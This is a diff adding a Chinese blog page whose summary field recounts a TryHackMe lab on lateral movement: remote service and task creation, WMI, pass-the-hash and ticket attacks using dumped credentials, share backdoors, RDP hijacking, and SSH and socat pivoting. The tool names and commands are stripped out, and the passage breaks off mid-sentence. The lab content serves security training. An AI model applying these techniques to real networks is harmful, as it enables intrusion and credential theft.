@@ -1,142 +1,218 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>THM-Lateral Movement and Pivoting | hybcx</title><meta name="keywords" content="TryHackMe"><meta name="author" content="hybcx,19815455497@163.com"><meta name="copyright" content="hybcx"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="THM-Lateral Movement and Pivoting"><meta name="application-name" content="THM-Lateral Movement and Pivoting"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="THM-Lateral Movement and Pivoting"><meta property="og:url" content="http://hybcx.xyz/2024/02/16/thm-lateral-movement-and-pivoting/index.html"><meta property="og:site_name" content="hybcx"><meta property="og:description" content="0x01 简介 在这个房间里，我们将研究横向移动，攻击者使用一组技术在网络中移动，同时创建尽可能少的警报。我们将了解为此目的而使用的几种常见技术以及所涉及的工具. 建议在此之前先浏览一下入侵 AD 和枚举 AD 房间。 学习目标  熟悉攻击者使用的横向移动技术。 了解如何使用替代认证材料进行横向移动"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg"><meta property="article:author" content="hybcx"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg"><meta name="description" content="0x01 简介 在这个房间里，我们将研究横向移动，攻击者使用一组技术在网络中移动，同时创建尽可能少的警报。我们将了解为此目的而使用的几种常见技术以及所涉及的工具. 建议在此之前先浏览一下入侵 AD 和枚举 AD 房间。 学习目标  熟悉攻击者使用的横向移动技术。 了解如何使用替代认证材料进行横向移动"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="http://hybcx.xyz/2024/02/16/thm-lateral-movement-and-pivoting/"><link rel="preconnect" href="//cdn.cbd.int"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?d98ea8480e5ec98a243adfc7bd46b93a";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script><script>const GLOBAL_CONFIG = {
+  linkPageTop: {"enable":true,"title":"向✌们无限学习","addFriendPlaceholder":"昵称（请勿包含博客等字样）：\n网站地址（要求博客地址，请勿提交个人主页）：\n头像图片url（请提供尽可能清晰的图片，我会上传到我自己的图床）：\n描述：\n站点截图（可选）：\n"},
+  peoplecanvas: undefined,
+  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
+  diytitle: {"enable":true,"leaveTitle":"w(ﾟДﾟ)w 不要走！再看看嘛！","backTitle":"♪(^∇^*)欢迎肥来！"},
+  LA51: {"enable":true,"ck":"3JLPGIZJOJw6Nvu2","LingQueMonitorID":"3JLPOLHV5W6IAty5"},
+  greetingBox: {"enable":true,"default":"晚上好👋","list":[{"greeting":"晚安😴","startTime":0,"endTime":5},{"greeting":"早上好鸭👋, 祝你一天好心情！","startTime":6,"endTime":9},{"greeting":"上午好👋, 状态很好，鼓励一下～","startTime":10,"endTime":10},{"greeting":"11点多啦, 在坚持一下就吃饭啦～","startTime":11,"endTime":11},{"greeting":"午安👋, 宝贝","startTime":12,"endTime":14},{"greeting":"🌈充实的一天辛苦啦！","startTime":14,"endTime":18},{"greeting":"19点喽, 奖励一顿丰盛的大餐吧🍔。","startTime":19,"endTime":19},{"greeting":"晚上好👋, 在属于自己的时间好好放松😌~","startTime":20,"endTime":24}]},
+  twikooEnvId: '',
+  commentBarrageConfig:undefined,
+  root: '/',
+  preloader: {"source":3},
+  friends_vue_info: undefined,
+  navMusic: true,
+  mainTone: undefined,
+  authorStatus: {"skills":null},
+  algolia: {"appId":"Z7A3XW4R2I","apiKey":"12db1ad54372045549ef465881c17e743","indexName":"my-hexo-blog","hits":{"per_page":6},"languages":{"input_placeholder":"输入关键词后按下回车查找","hits_empty":"找不到您查询的内容：${query}","hits_stats":"找到 ${hits} 条结果，用时 ${time} 毫秒"}},
+  localSearch: undefined,
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
+  noticeOutdate: {"limitDay":365,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: true,
+    simplehomepage: false,
+    post: true
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: hybcx","link":"链接: ","source":"来源: hybcx","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
+  lightbox: 'mediumZoom',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
+      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isAnchor: false,
+  shortcutKey: undefined,
+  autoDarkmode: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  configTitle: 'hybcx',
+  title: 'THM-Lateral Movement and Pivoting',
+  postAI: '',
+  pageFillDescription: '0x01 简介, 学习目标, 索取您的凭证, 0x02 通过网络移动, 什么是横向运动？, 一个简单的例子, 攻击者的视角, 管理员和UAC, 0x03 远程生成过程, Psexec 执行程序, 使用 WinRM 远程创建进程, 使用 sc 远程创建服务, 远程创建计划任务, 实践练习, 0x04 使用 WMI 横向移动, 从 Powershell 连接到 WMI, 使用 WMI 远程创建进程, 使用 WMI 远程创建服务, 使用 WMI 远程创建计划任务, WMI 通过 WMI 安装 MSI 包, 实践练习, 0x05 使用替代认证材料, NTLM认证, 传递哈希值, 从本地 SAM 中提取 NTLM 哈希值, 从 LSASS 内存中提取 NTLM 哈希值, 使用 Linux 传递哈希, Kerberos 身份验证, 传票, 跨越哈希/传递密钥, 实践练习, Pass-the-Hash, Pass-the-Ticket, Pass-the-Key, 0x06 滥用用户行为, 滥用可写股份, 后门 .vbs 脚本, .exe 文件后门, RDP劫持, 实践练习, 0x07 端口转发, SSH 隧道, SSH 远程端口转发, SSH 本地端口转发, 使用 socat 进行端口转发, 动态端口转发和 SOCKS, 实践练习, 隧道复杂漏洞, 0x08 参考文章简介在这个房间里我们将研究横向移动攻击者使用一组技术在网络中移动同时创建尽可能少的警报我们将了解为此目的而使用的几种常见技术以及所涉及的工具建议在此之前先浏览一下入侵和枚举房间学习目标熟悉攻击者使用的横向移动技术了解如何使用替代认证材料进行横向移动了解使用受感染主机作为枢纽的不同方法索取您的凭证为了模拟违规您将获得第一组凭据网络设置完成后在攻击箱上导航至以请求您的凭据对单击获取凭据按钮以接收可用于初始访问的凭据对此凭证对将为您提供对的访问可以被视为进入该环境的跳转主机模拟您已实现的立足点对于访问您可以使用以下命令获取到的凭证如下即通过网络移动什么是横向运动简而言之横向移动是攻击者用来在网络中移动的一组技术一旦攻击者获得对网络第一台计算机的访问权出于多种原因移动就变得至关重要其中包括实现攻击者的目标绕过现有的网络限制建立额外的网络入口点制造混乱和避免被发现虽然许多网络杀伤链将横向移动视为线性过程的附加步骤但它实际上是循环的一部分在此周期中我们使用任何可用的凭据来执行横向移动使我们能够访问新机器在其中我们可以提升权限并提取凭据如果可能有了新的凭证循环又开始了通常我们会重复这个循环几次然后才能达到网络上的最终目标如果我们的第一个立足点是一台几乎无法访问其他网络资源的计算机那么我们可能需要横向移动到在网络上拥有更多权限的其他主机一个简单的例子假设我们正在执行红队参与我们的最终目标是到达内部代码存储库我们通过网络钓鱼活动在目标网络上获得了第一次妥协通常网络钓鱼活动对非技术用户更有效因此我们的第一次访问可能是通过营销部门的机器进行的营销工作站通常会受到防火墙策略的限制无法访问网络上的任何关键服务包括管理协议数据库端口监控服务或日常工作不需要的任何其他服务包括代码存储库为了到达敏感的主机和服务我们需要转移到其他主机并从那里转向我们的最终目标为此我们可以尝试提升营销工作站的权限并提取本地用户的密码哈希值如果我们找到本地管理员则其他主机上可能存在相同的帐户经过一番侦察我们发现了一个名为的工作站我们使用本地管理员的密码哈希来访问并确认它属于公司的一位开发人员所有从那里可以访问我们的目标代码存储库请注意虽然可能需要使用横向移动来规避防火墙限制但它也有助于逃避检测在我们的示例中即使营销工作站可以直接访问代码存储库也可能需要通过开发人员的进行连接从检查登录审核日志的蓝队分析师的角度来看这种行为的可疑性较小攻击者的视角攻击者可以通过多种方式进行横向移动最简单的方法是使用标准管理协议例如或连接到网络上的其他计算机只要在规划与哪个帐户连接的位置时保持一定的一致性这种方法就可以在某种程度上模拟常规用户的行为虽然部门的用户通过连接到服务器可能很常见并且不会受到关注但必须注意不要尝试可疑的连接例如为什么本地管理员用户从营销部门连接到个人电脑如今攻击者还可以使用其他横向移动方法同时使蓝队有效检测正在发生的情况变得更具挑战性虽然没有任何技术应该被认为是万无一失的但我们至少可以尝试尽可能保持沉默在接下来的任务中我们将了解一些最常见的横向运动技术管理员和在执行整个房间中介绍的大部分横向移动技术时我们将主要使用管理员凭据虽然人们可能期望每个管理员帐户都具有相同的目的但必须区分两种类型的管理员本地帐户属于本地管理员组域帐户属于本地管理员组我们感兴趣的差异是用户帐户控制对本地管理员默认管理员帐户除外施加的限制默认情况下除非通过使用交互式会话否则本地管理员将无法远程连接到计算机并执行管理任务将拒绝通过或请求的任何管理任务因为此类管理员将使用经过过滤的介质完整性令牌登录从而防止帐户执行特权操作唯一获得完全权限的本地帐户是默认管理员帐户具有本地管理权限的域帐户不会受到相同的处理并且将以完全管理权限登录如果需要可以禁用此安全功能有时您会发现管理员组中的本地帐户和域帐户之间没有区别不过重要的是要记住如果某些横向移动技术失败可能是由于使用了强制执行的非默认本地管理员您可以在此处阅读有关此安全功能的更多详细信息远程生成过程此任务将研究攻击者远程生成进程的可用方法允许他们在拥有有效凭据的计算机上运行命令所讨论的每种技术都使用略有不同的方法来实现相同的目的其中一些可能更适合某些特定场景执行程序所需的组成员身份管理员多年来一直是需要远程执行进程时的首选方法它允许管理员用户在他有权访问的任何上远程运行命令是众多工具之一可以在此处下载的工作方式如下连接到共享并上传服务二进制文件使用作为名称连接到服务控制管理器以创建并运行名为的服务并将服务二进制文件与关联创建一些命名管道来处理要运行我们只需提供远程主机所需的管理员凭据以及我们要运行的命令为方便起见可在中的下找到使用远程创建进程所需的组成员身份远程管理用户远程管理是一种基于的协议用于远程向主机发送命令大多数安装都会默认启用这使其成为一个有吸引力的攻击媒介要从命令行连接到远程会话我们可以使用以下命令我们可以从实现相同的目的但要传递不同的凭据我们需要创建一个对象获得对象后我们可以使用创建交互式会话还包括它通过远程运行凭证也必须通过对象传递使用远程创建服务端口基于命名管道的基于命名管道的所需的组成员身份管理员服务也可用于运行任意命令因为它们在启动时执行命令虽然服务可执行文件在技术上与常规应用程序不同但如果我们配置服务来运行任何应用程序它仍然会执行该应用程序并随后失败我们可以使用中提供的标准工具在远程主机上创建服务使用时它会通过几种方式尝试通过连接到远程服务程序将使用进行连接尝试客户端将首先在端口连接到端点映射器该端点映射器充当可用端点的目录并请求有关服务程序的信息然后将响应和端口以连接到该端口通常是范围内的动态端口如果后一个连接失败将尝试通过端口或基于的上的命名管道到达我们可以使用以下命令创建并启动名为的服务服务启动时将执行命令在系统上创建一个新的本地用户由于操作系统负责启动服务因此您将无法查看命令输出要停止并删除该服务我们可以执行以下命令远程创建计划任务我们可以使用的另一个功能是计划任务您可以使用远程创建并运行一个任务该任务可在任何安装中使用要创建名为的任务我们可以使用以下命令我们将计划类型设置为这意味着该任务仅在指定的时间和日期运行一次由于我们将手动运行任务因此开始日期和开始时间无论如何都不重要由于系统将运行计划任务因此我们将无法获得该命令的输出这使得这是一种盲目攻击最后要删除计划任务我们可以使用以下命令并自行清理实践练习对于本练习我们假设我们已经捕获了一些具有管理访问权限的凭据我们将展示如何使用这些凭据通过横向移动到请随意尝试其他方法因为它们都应该适用于虽然我们已经展示了如何使用在远程系统上创建用户通过使用但我们还可以上传我们想要执行的任何二进制文件并将其与创建的服务关联但是如果我们尝试使用此方法运行反向我们会注意到反向在执行后立即断开连接原因是服务可执行文件与标准文件不同因此非服务可执行文件几乎会立即被服务管理器杀死对我们来说幸运的是支持格式它将我们喜欢的任何有效负载封装在功能齐全的服务可执行文件中防止其被杀死要创建反向我们可以使用以下命令注意由于您将与其他人共享实验室因此您需要为有效负载使用不同的文件名而不是以避免覆盖其他人的有效负载然后我们将继续使用凭据使用中的将有效负载上传到的共享上传可执行文件后我们将在攻击者的计算机上设置一个侦听器以接收来自的反向或者您可以在控制台上运行以下单行代码来执行相同的操作由于不允许我们在命令中指定凭据因此我们需要使用使用的访问令牌生成一个新尽管如此我们只能通过访问计算机因此如果我们尝试类似的内容新的命令提示符将在用户会话中生成但我们无法访问它为了解决这个问题我们可以使用生成带有访问令牌的第二个反向注意请记住由于您将与选项一起使用因此不会费心检查所提供的凭据是否有效有关此的更多信息请参阅枚举室因此请务必正确输入密码如果不这样做您稍后会在房间中看到一些错误我们可以像往常一样在中使用接收反向连接最后继续使用远程创建一个新服务并将其与我们上传的二进制文件关联起来请务必更改您的服务名称以避免与其他学生发生冲突启动该服务后您应该会在中收到一个连接您可以从该连接访问桌面上的第一个标志使用横向移动我们还可以使用以不同的方式执行上一个任务中讨论的许多技术是基于的企业管理的实现是跨设备访问管理信息的企业标准简单来说允许管理员执行标准管理任务攻击者可以滥用这些任务以各种方式执行横向移动我们将对此进行讨论从连接到在能够使用命令连接到之前我们需要使用我们的用户和密码创建一个对象该对象将存储在变量中并在该任务的整个技术中使用然后我们继续使用以下协议之一建立会话将用于连接到该协议使用端口和端口正如使用时所解释的那样将用于连接到此协议使用端口或要从建立会话我们可以使用以下命令并将会话存储在变量中我们将在整个房间中使用不同的技术用于配置会话的连接选项包括连接协议然后选项和凭据将传递到以建立针对远程主机的会话使用远程创建进程或所需的组成员身份管理员我们可以利用从远程生成一个进程向类发送请求以在我们之前创建的会话下生成该进程请注意不允许您查看任何命令的输出但确实会静默创建所需的进程在旧系统上可以在命令提示符下使用完成相同的操作使用远程创建服务或所需的组成员身份管理员我们可以通过使用创建服务要创建名为的服务我们可以使用以下命令然后我们可以获取该服务的句柄并使用以下命令启动它最后我们可以使用以下命令停止并删除该服务使用远程创建计划任务或所需的组成员身份管理员我们可以使用默认安装中提供的一些创建并执行计划任务要在使用完计划任务后将其删除我们可以使用以下命令通过安装包或所需的组成员身份管理员是一种用于安装程序的文件格式如果我们可以将包复制到目标系统那么我们就可以使用尝试为我们安装它攻击者可以通过任何可用的方式复制该文件一旦文件位于目标系统中我们就可以尝试通过调用类来安装它我们可以通过在遗留系统中使用来实现相同的目的实践练习对于本练习我们假设我们已经捕获了一些具有管理访问权限的凭据用户我们将展示如何使用这些凭据通过和包横向移动到请随意尝试此任务中介绍的其他方法我们将首先从攻击者机器上使用创建有效负载注意由于您将与其他人共享实验室因此您需要为有效负载使用不同的文件名而不是以避免覆盖其他人的有效负载然后我们使用或任何其他可用的方法复制有效负载由于我们将有效负载复制到共享因此它将在服务器上的中可用我们启动一个处理程序来接收来自的反向让我们从控制台启动针对的会话然后我们从类调用方法来触发有效负载因此您应该在中收到一个连接您可以通过该连接访问桌面上的标志使用替代认证材料通过替代身份验证材料我们指的是可用于访问帐户而无需实际知道用户密码本身的任何数据这是可能的因为网络使用的某些身份验证协议的工作方式在此任务中我们将研究当网络上存在以下任一身份验证协议时可作为用户登录的几种替代方案认证身份验证注意在此任务中假定您熟悉从主机提取凭据的方法和工具将被用作整个房间中凭证提取的首选工具认证在深入研究实际的横向移动技术之前我们先看一下身份验证的工作原理客户端向他们想要访问的服务器发送身份验证请求服务器生成一个随机数并将其作为质询发送给客户端客户端将其密码哈希与质询以及其他已知数据结合起来生成对质询的响应并将其发送回服务器进行验证服务器将质询和响应转发给域控制器进行验证域控制器使用质询重新计算响应并将其与客户端发送的初始响应进行比较如果两者匹配则客户端通过身份验证否则访问将被拒绝认证结果发送回服务器服务器将认证结果转发给客户端注意所描述的过程适用于使用域帐户时如果使用本地帐户服务器可以验证对质询本身的响应而无需与域控制器交互因为它的上本地存储有密码哈希值传递哈希值从我们获得管理权限的主机中提取凭据通过使用或类似工具后我们可能会获得可以轻松破解的明文密码或哈希值然而如果我们不够幸运我们最终会得到未破解的密码哈希值尽管我们似乎无法真正使用这些哈希值但只需知道密码哈希值即可响应身份验证期间发送的质询这意味着我们可以在不需要知道明文密码的情况下进行身份验证如果域配置为使用身份验证则无需破解哈希值我们就可以传递哈希值并成功进行身份验证要提取哈希值我们可以使用读取本地或直接从内存中提取哈希值从本地中提取哈希值此方法仅允许您从计算机上的本地用户获取哈希值没有域用户的哈希值可用从内存中提取哈希值此方法将允许您提取本地用户和最近登录到计算机的任何域用户的任何哈希值然后我们可以使用提取的哈希值来执行攻击方法是使用在反向或您喜欢的任何其他命令上为受害者用户注入访问令牌如下所示请注意我们使用来重新建立原始令牌权限因为尝试使用提升的令牌传递哈希将不起作用这相当于使用但使用哈希而不是密码并将生成一个新的反向我们可以从其中以受害者用户身份启动任何命令要接收反向我们应该在上运行反向侦听器有趣的是如果您在此上运行命令它仍然会显示您在执行之前使用的原始用户但从这里运行的任何命令实际上都会使用我们使用注入的凭据使用传递哈希如果您可以访问盒子如有几个工具具有内置支持可以使用不同的协议执行根据您可以使用的服务您可以执行以下操作使用连接到使用通过连接注意仅版本的支持使用连接到身份验证让我们快速了解一下身份验证在网络上的工作原理用户将其用户名和使用从其密码派生的密钥加密的时间戳发送到密钥分发中心该服务通常安装在域控制器上负责在网络上创建票证将创建并发回票证授予票证允许用户请求票证来访问特定服务而无需将其凭据传递给服务本身与一起还将向用户提供会话密钥用户将需要该会话密钥来生成后续请求请注意使用帐户的密码哈希进行加密因此用户无法访问其内容重要的是要知道加密的包括会话密钥的副本作为其内容的一部分并且不需要存储会话密钥因为它可以在需要时通过解密来恢复副本当用户想要连接到网络上的服务例如共享网站或数据库时他们将使用向请求票证授予服务是只允许连接到为其创建的特定服务的票证要请求用户将发送他的用户名和使用会话密钥加密的时间戳以及和服务主体名称该名称指示我们打算访问的服务和服务器名称因此将向我们发送和服务会话密钥我们需要对我们想要访问的服务进行身份验证使用服务所有者哈希进行加密服务所有者是运行服务的用户或计算机帐户在其加密内容上包含服务会话密钥的副本以便服务所有者可以通过解密来访问它然后可以将发送到所需的服务以进行身份验证并建立连接该服务将使用其配置的帐户的密码哈希来解密并验证服务会话密钥传票有时可以使用从内存中提取票证和会话密钥该过程通常需要我们在被攻击的机器上拥有权限可以按如下方式完成请注意如果我们只能访问票证而不能访问其相应的会话密钥则我们将无法使用该票证因此两者都是必要的虽然可以从进程的内存中提取任何可用的或但大多数时候我们会对感兴趣因为它们可用于请求访问允许用户访问的任何服务同时仅适用于特定服务提取需要我们拥有管理员凭据并且可以使用低权限帐户仅分配给该帐户的帐户来提取一旦我们提取了所需的票证我们就可以使用以下命令将票证注入当前会话在我们自己的会话中注入票证不需要管理员权限此后我们用于横向移动的任何工具都可以使用门票要检查票证是否已正确注入您可以使用命令跨越哈希传递密钥这种攻击与类似但适用于网络当用户请求时他们会发送使用从其密码派生的加密密钥加密的时间戳用于派生此密钥的算法可以是在当前版本上默认禁用或具体取决于安装的版本和配置如果我们拥有这些密钥中的任何一个我们就可以向请求而无需实际密码因此得名传递密钥我们可以通过使用和以下命令从内存中获取加密密钥根据可用的密钥我们可以在上运行以下命令以通过密钥传递来获取反向为方便起见中已提供如果我们有哈希如果我们有哈希如果我们有哈希请注意使用时密钥将等于用户的哈希值这意味着如果我们可以提取哈希只要是启用的协议之一我们就可以使用它来请求这种特殊的变体通常被称为要接收反向我们应该在上运行反向侦听器就像一样从此运行的任何命令都将使用通过注入的凭据实践练习要开始本练习您需要使用以下凭据通过连接到用户这些凭据将授予您对的管理访问权限允许您使用转储执行此任务期间提供的任何技术所需的身份验证材料使用会话使用提取身份验证材料并针对域用户执行或一旦您的命令提示符已加载其凭据请使用连接到上的命令提示符由于任何攻击都已将的凭据注入到您的会话中因此您可以使用而不指定任何凭据并且它将使用当前会话可用的凭据您会在上的桌面上找到一个标志和均可在上的处获取首先就是获取计算机上用户的哈希值或者我使用的后者接着找到目标用户对应的值如下图所示然后我们可以使用提取的哈希值来执行攻击方法是使用在反向或您喜欢的任何其他命令上为受害者用户注入访问令牌如下所示请注意我们使用来重新建立原始令牌权限因为尝试使用提升的令牌传递哈希将不起作用成功拿到接着执行如下命令一旦您的命令提示符已加载其凭据请使用连接到上的命令提示符由于任何攻击都已将的凭据注入到您的会话中因此您可以使用而不指定任何凭据并且它将使用当前会话可用的凭据您会在上的桌面上找到一个标志和均可在上的处获取如果在目标机拥有管理员权限则可以使用该方法请注意如果我们只能访问票证而不能访问其相应的会话密钥则我们将无法使用该票证因此两者都是必要的如上图我们获取到了目标用户的票证一旦我们提取了所需的票证我们就可以使用以下命令将票证注入当前会话在我们自己的会话中注入票证不需要管理员权限此后我们用于横向移动的任何工具都可以使用门票要检查票证是否已正确注入您可以使用命令可以看到我们成功注入会话成功进入目标用户的可以看到目标用户可以使用算法以及这里就用了这里也是成功拿到不过恰好靶机重置了没截到图这里就算了滥用用户行为在某些情况下攻击者可以利用用户执行的操作来进一步访问网络中的计算机虽然发生这种情况的方式有很多种但我们将讨论一些最常见的方式滥用可写股份在检查公司环境时经常会发现合法用户用来执行日常任务的网络共享如果这些共享由于某种原因是可写的攻击者就可以植入特定文件来强制用户执行任意有效负载并获得对其计算机的访问权限一种常见的情况是查找网络共享上托管的脚本或可执行文件的快捷方式其背后的基本原理是管理员可以在网络共享上维护可执行文件并且用户可以执行它而无需将应用程序复制或安装到每个用户的计算机上如果我们作为攻击者拥有对此类脚本或可执行文件的写入权限我们就可以对它们进行后门以强迫用户执行我们想要的任何有效负载尽管脚本或可执行文件托管在服务器上但当用户在其工作站上打开快捷方式时可执行文件将从服务器复制到其文件夹并在工作站上执行因此任何有效负载都将在最终用户工作站和登录用户帐户的上下文中运行后门脚本例如如果共享资源是脚本我们可以将的副本放在同一个共享上并在共享脚本中注入以下代码这会将从共享复制到用户工作站目录并在用户打开共享脚本时向攻击者发送反向文件后门如果共享文件是二进制文件例如您可以从共享下载它并使用向其中注入后门该二进制文件仍将照常工作但会静默执行额外的有效负载要创建后门我们可以使用以下命令生成的将在用户没有注意到的情况下执行有效负载文件生成后我们可以替换共享上的可执行文件并使用中的模块等待任何连接劫持当管理员使用远程桌面连接到计算机并关闭客户端而不是注销时他的会话将无限期地在服务器上保持打开状态如果您在及更早版本上拥有系统权限则无需密码即可接管任何现有会话如果我们有管理员级别的访问权限我们可以通过我们喜欢的任何方法获取现在我们将使用来执行此操作首先让我们以管理员身份运行从那里运行可在处获取要列出服务器上现有的会话可以使用以下命令根据上面的命令输出如果我们当前使用管理员用户通过连接我们的将为我们还可以看到名为的用户打开了一个为的会话任何具有光盘状态的会话都已被用户保持打开状态并且目前未被使用虽然您也可以接管活动会话但当您这样做时合法用户将被迫退出其会话他们可能会注意到这一点要连接到会话我们将使用并指定我们将接管的会话以及当前的按照前面的示例如果我们以管理员用户身份连接要接管的会话我们将使用以下命令简单来说该命令指出拥有的图形会话应与管理员用户拥有的会话连接因此我们将恢复的会话并立即连接到它注意不允许您在不知道密码的情况下连接到其他用户的会话实践练习要完成此练习您需要使用从获取的一组新凭据连接到请注意此链接与其他任务不同获得凭据后通过连接到这些凭据将授予您对的管理访问权限对于此任务我们将劫持会话如果您有兴趣尝试在或其他文件中添加后门您可以在本地持久性室中找到一些与此相关的练习按照说明劫持在上的会话以获取您的标志注意执行时您将看到几个名为的用户后跟一个数字这些只是同一用户的相同副本您可以劫持其中任何一个您不需要劫持全部确保劫持标记为已断开连接的会话光盘以避免干扰其他用户当我们以管理员打开之后运行如下命令接着列出服务器上所有的会话要连接到会话我们将使用并指定我们将接管的会话以及当前的按照前面的示例如果我们以管理员用户身份连接要接管的会话我们将使用以下命令简单来说该命令指出拥有的图形会话应与管理员用户拥有的会话连接如下图成功窃取到会话端口转发我们提出的大多数横向移动技术都需要特定端口可供攻击者使用在现实网络中管理员可能出于安全原因阻止了其中一些端口或者在网络周围实施了分段从而阻止您访问或端口为了绕过这些限制我们可以使用端口转发技术其中包括使用任何受感染的主机作为跳转盒来转向其他主机预计某些机器将比其他机器拥有更多的网络权限因为企业中的每个角色在日常工作所需的网络服务方面都有不同的需求隧道我们要研究的第一个协议是因为它已经具有通过称为隧道的功能进行端口转发的内置功能虽然曾经是与系统相关的协议但现在默认附带客户端因此您可以在当今的许多系统中找到它而与操作系统无关隧道可以以不同的方式使用通过连接转发端口我们将根据情况使用它为了解释每种情况我们假设一个场景我们已经获得了对机器的控制权不需要管理员访问权限并且希望将其用作访问另一台机器上的端口的枢纽我们无法直接连接我们将启动一条从计算机充当客户端到攻击者充当服务器的隧道这样做的原因是您经常会在计算机上找到客户端但大多数时候没有可用的服务器由于我们将连接回攻击者的计算机因此我们希望在其中创建一个用户而无需访问任何隧道控制台并设置用于创建隧道的密码根据您的需要隧道可用于执行本地或远程端口转发让我们看一下每个案例远程端口转发在我们的示例中假设防火墙策略阻止攻击者的计算机直接访问服务器上的端口如果攻击者之前已入侵并且可以访问服务器的端口则可以使用的远程端口转发将其转移到端口远程端口转发允许您从客户端在本例中为获取可访问的端口并将其投射到远程服务器攻击者的计算机中结果攻击者的计算机上将打开一个端口可用于通过隧道连接回服务器中的端口反过来将代理连接以便服务器将看到所有流量就好像它来自一样此时可能会出现的一个有效问题是如果我们已经破坏了并且可以直接从那里运行会话为什么我们需要端口转发答案很简单在我们只能通过控制台访问的情况下我们将无法使用任何客户端因为我们没有通过使攻击者的计算机可以使用该端口您可以使用客户端进行连接当您想要针对无法直接访问的端口运行漏洞利用时会出现类似的情况因为您的漏洞利用可能需要特定的脚本语言而这种语言可能并不总是在您妥协的计算机上可用参考上图要将服务器上的端口转发回攻击者的计算机我们可以在上使用以下命令这将使用用户建立从到攻击者的会话由于不允许在攻击者上运行因此我们需要使用开关运行命令以防止客户端请求一个否则连接将立即退出开关用于请求远程端口转发语法要求我们首先指示将在服务器上打开的端口后跟冒号然后是和端口我们将转发的套接字的名称请注意端口号不需要匹配但在本示例中需要匹配命令本身不会输出任何内容但隧道将取决于要运行的命令无论何时我们都可以像使用任何其他命令一样按来关闭隧道一旦我们的隧道设置并运行我们就可以访问攻击者的计算机并通过进入转发端口来到达服务器本地端口转发本地端口转发允许我们将端口从服务器拉到客户端在我们的场景中这可用于获取攻击者计算机中可用的任何服务并通过上的端口使其可用这样任何无法直接连接到攻击者但可以连接到的主机现在都可以通过枢轴主机访问攻击者的服务使用这种类型的端口转发将允许我们从通常无法连接回我们的主机上运行反向或者仅仅是使我们想要的任何服务对于没有直接连接到我们的机器的机器可用要从攻击者的计算机转发端口并使其可从访问我们可以在上运行以下命令该命令结构与远程端口转发中使用的命令结构类似但使用选项进行本地端口转发此选项要求我们指示用于接收连接的本地套接字以及从攻击者的角度连接的远程套接字请注意我们在第二个套接字中使用地址从攻击者的角度来看这是持有要转发的端口的主机由于我们在上打开一个新端口因此我们可能需要添加防火墙规则以允许传入连接使用为此需要管理权限设置隧道后任何将浏览器指向的的用户都会看到攻击者计算机发布的网站使用进行端口转发在不可用的情况下可用于执行类似的功能虽然不如灵活但允许您以更简单的方式转发端口使用的缺点之一是我们需要将其传输到枢轴主机在我们当前的示例中为使其比更容易被检测到但在没有其他选项可用的情况下可能值得一试使用执行端口转发的基本语法要简单得多如果我们想打开主机上的端口并将我们收到的任何连接转发到主机上的端口您将使用以下命令选项允许为收到的每个连接创建一个新进程从而可以在不关闭的情况下处理多个连接如果不包含它将在第一个连接完成时关闭回到我们的示例如果我们想像使用远程端口转发一样使用作为枢纽来访问服务器上的端口我们可以使用以下命令请注意无法像那样将连接直接转发到攻击者的计算机但会在上打开一个端口攻击者的计算机随后可以连接到该端口像往常一样由于在枢轴主机上打开了一个端口我们可能需要创建一个防火墙规则以允许到该端口的任何连接另一方面如果我们想从攻击者的机器公开端口以便服务器可以访问它我们只需